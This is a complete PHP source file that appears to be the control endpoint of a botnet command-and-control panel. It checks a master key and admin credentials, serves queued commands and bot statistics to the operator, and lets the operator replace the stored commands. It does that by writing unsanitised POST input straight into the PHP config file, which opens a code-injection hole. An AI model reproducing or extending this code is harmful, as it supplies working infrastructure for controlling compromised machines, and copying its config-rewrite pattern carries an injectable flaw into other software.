<?php

    define( "FILE", true );
    include( "inc/config.php" );
    include( "inc/functions.php" );
    include( "adm/functions.php" );

    if( $_POST['mk'] == $conf['masterkey'] && $_POST['an'] == $conf['adname'] && $_POST['ap'] == $conf['adpass'] )
    {

       mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) ;
       mysql_select_db($conf['dbname']);


       if( $_POST['mode'] == '0' )
       {
          print( 'svt'.$conf['command'] );
       }

       if( $_POST['mode'] == '1' )
       {
          print( 'svt'.$conf['command_unpriority'] );
       }

       if( $_POST['mode'] == '2' ) 
       {
          $stat = make_stat_simp();
          print( 'svt'.$stat[1] );
       }

       if( $_POST['mode'] == '3' ) 
       {
          $stat = make_stat_simp();
          print( 'svt'.$stat[2] );
       }

       if( $_POST['mode'] == '4' ) 
       {
          $stat = make_stat_simp();
          print( 'svt'.$stat[3] );
       }

       if( $_POST['mode'] == '5' ) 
       {
          $stat = make_stat_simp();
          print( 'svt'.$stat[4] );
       }

       if( $_POST['mode'] == '6' ) 
       {
	   $command = $_POST['rcmd'];
	   $content = file_get_contents( "inc/config.php" );
	   $content = str_replace( "\$conf['command'] = \"".$conf['command']."\";", "\$conf['command'] = \"".$command."\";", $content );
	   save_conf( "inc/config.php", $content, 1 );
       }

       if( $_POST['mode'] == '7' ) 
       {
	   $command = $_POST['rcmd'];
	   $content = file_get_contents( "inc/config.php" );
	   $content = str_replace( "\$conf['command_unpriority'] = \"".$conf['command_unpriority']."\";", "\$conf['command_unpriority'] = \"".$command."\";", $content );
	   save_conf( "inc/config.php", $content, 1 );
       }

    }

?>